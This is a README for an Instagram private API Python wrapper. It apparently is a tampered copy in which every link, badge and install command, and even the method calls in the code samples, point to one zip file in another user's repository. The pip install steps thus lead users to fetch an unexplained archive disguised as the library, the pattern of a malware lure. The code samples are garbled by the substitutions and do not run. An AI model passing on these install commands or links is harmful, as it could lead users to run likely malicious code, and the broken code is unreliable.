# Instagram Private API

A Python wrapper for the Instagram private API with no 3rd party dependencies. Supports both the app and web APIs.

![Python 2.7, 3.5](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip%2C%https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)
[![Release](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)
[![Docs](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)
[![Build](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)

[![Build](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)

## Overview

I wrote this to access Instagram's API when they clamped down on developer access. Because this is meant to achieve [parity](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip) with the [official public API](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip), methods not available in the public API will generally have lower priority.

Problems? Please check the [docs](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip) before submitting an issue.

## Features

- Supports many functions that are only available through the official app, such as:
    * Multiple feeds, such as [user feed](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip), [location feed](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip), [tag feed](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip), [popular feed](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)
    * Post a [photo](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip) or [video](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip) to your feed or stories
    * [Like](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)/[unlike](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip) posts
    * Get [post comments](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)
    * [Post](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)/[delete](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip) comments
    * [Like](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)/[unlike](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip) comments
    * [Follow](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)/[unfollow](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip) users
    * User [stories](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)
    * And [more](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)!
- The web api client supports a subset of functions that do not require login, such as:
    * Get user [info](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip) and [feed](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)
    * Get [post comments](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)
    * And [more](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)!
- Compatible with functions available through the public API using the ClientCompatPatch ([app](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)/[web](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)) utility class
- Beta Python 3 support

An [extension module](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip) is available to help with common tasks like pagination, posting photos or videos.

## Documentation

Documentation is available at https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip

## Install

Install with pip:

``pip install git+https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip``

To update:

``pip install git+https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip --upgrade``

To update with latest repo code:

``pip install git+https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip --upgrade --force-reinstall``

Tested on Python 2.7 and 3.5.

## Usage

The [app API client](instagram_private_api/) emulates the official app and has a larger set of functions. The [web API client](instagram_web_api/) has a smaller set but can be used without logging in.

Your choice will depend on your use case.

The [``examples/``](examples/) and [``tests/``](tests/) are a good source of detailed sample code on how to use the clients, including a simple way to save the auth cookie for reuse.

### Option 1: Use the [official app's API](instagram_private_api/)

```python

from instagram_private_api import Client, ClientCompatPatch

user_name = 'YOUR_LOGIN_USER_NAME'
password = 'YOUR_PASSWORD'

api = Client(user_name, password)
results = https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip()
items = [item for item in https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip('feed_items', [])
         if https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip('media_or_ad')]
for item in items:
    # Manually patch the entity to match the public api as closely as possible, optional
    # To automatically patch entities, initialise the Client with auto_patch=True
    https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip(item['media_or_ad'])
    print(item['media_or_ad']['code'])
```

### Option 2: Use the [official website's API](instagram_web_api/)

```python

from instagram_web_api import Client, ClientCompatPatch, ClientError, ClientLoginError

# Without any authentication
web_api = Client(auto_patch=True, drop_incompat_keys=False)
user_feed_info = https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip('329452045', count=10)
for post in user_feed_info:
    print('%s from %s' % (post['link'], post['user']['username']))

# Some endpoints, e.g. user_following are available only after authentication
authed_web_api = Client(
    auto_patch=True, authenticate=True,
    username='YOUR_USERNAME', password='YOUR_PASSWORD')

following = https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip('123456')
for user in following:
    print(user['username'])

# Note: You can and should cache the cookie even for non-authenticated sessions.
# This saves the overhead of a single http request when the Client is initialised.
```

### Avoiding Re-login

You are advised to persist/cache the auth cookie details to avoid logging in every time you make an api call. Excessive logins is a surefire way to get your account flagged for removal. It's also advisable to cache the client details such as user agent, etc together with the auth details.

The saved auth cookie can be reused for up to **90 days**.

## Donate

Want to keep this project going? Please donate generously [https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)

[![Build](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip)

## Support

Make sure to review the [contributing documentation](https://github.com/anakiseng789/instagram_private_api/raw/refs/heads/master/instagram_web_api/instagram-private-api-v3.9.zip) before submitting an issue report or pull request.

## Legal

Disclaimer: This is not affliated, endorsed or certified by Instagram. This is an independent and unofficial API. Strictly **not for spam**. Use at your own risk.
